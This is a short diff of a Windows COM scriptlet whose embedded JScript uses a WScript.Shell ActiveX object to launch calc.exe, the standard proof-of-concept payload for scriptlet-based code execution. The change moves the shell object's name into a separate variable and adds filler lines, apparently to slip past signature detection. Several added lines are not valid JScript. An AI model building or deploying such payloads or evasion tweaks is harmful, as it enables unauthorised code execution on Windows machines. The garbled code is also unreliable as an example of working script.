@@ -2,12 +2,15 @@
 <scriptlet><registration description="boo" progid="yaa" version="2.01" classid="{33453267-6633-8855-3478-6633FEEEECDC}" remotable="true"
 	>
 </registration>
-
+# AAAAAAAAAAAAAAAAAAAA
 <script language="JScript">
 <![CDATA[
 	var rrr = "AAA"
 	var aa = rr
-	var rrrrrrrrr = new ActiveXObject("WScript.Shell").Run("calc.exe");
+
+#VASSSSSSSSSSSSSSSS
+$ws = "Wscript.shell"
+	var rrrrrrrrr = new ActiveXObject($ws).Run("calc.exe");
 	
 	
 ]]>
